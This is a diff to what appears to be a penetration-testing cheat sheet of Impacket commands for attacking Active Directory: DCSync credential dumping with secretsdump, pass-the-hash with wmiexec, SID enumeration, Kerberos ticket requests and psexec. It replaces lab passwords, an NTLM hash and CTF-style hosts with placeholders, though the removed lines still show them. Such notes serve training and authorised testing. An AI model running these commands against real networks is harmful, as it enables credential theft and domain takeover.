@@ -33,27 +33,27 @@ Retrieve Kerberoastable accounts `sudo impacket-GetUserSPNs -request -dc-ip 192.
 ## Impacket Secretsdump (DCsync)
 With valid credentials and right privileges the jeffadmin user can dump the dave user creds through DCsync attack
 ```bash
-impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
+impacket-secretsdump -just-dc-user <target-user> '<domain>/<authorized-user>:<password>@<dc-ip>'
 ```
 ### Impacket WMIExec
 Connect as the local administrator with the NTML hash; SMB hash to be turned on. 
 ```bash
-/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
+/usr/bin/impacket-wmiexec -hashes ':<ntlm-hash>' '<authorized-user>@<target>'
 ```
 
 ### Impacket LookUpSID
 Check for known usernames on flight.htb domain
 ```
-impacket-lookupsid flight.htb/svc_apache:"S@Ss!K@*t13"@flight.htb
+impacket-lookupsid '<domain>/<authorized-user>:<password>@<dc-host>'
 ```
 
 #### Get TGT ticket
 ```
 ntpdate frizzdc.frizz.htb    
-impacket-getTGT frizz.htb/'f.frizzle':'Jenni_Luvs_Magic23' -dc-ip frizzdc.frizz.htb    
-export KRB5CCNAME=f.frizzle.ccache  
-ssh f.frizzle@frizz.htb -K
-impacket-psexec -no-pass -k administrator@dc01.poseidon.yzx
+impacket-getTGT '<domain>/<authorized-user>:<password>' -dc-ip <dc-host>
+export KRB5CCNAME=<authorized-user>.ccache
+ssh <authorized-user>@<target> -K
+impacket-psexec -no-pass -k '<authorized-admin>@<dc-host>'
 ```
 
 
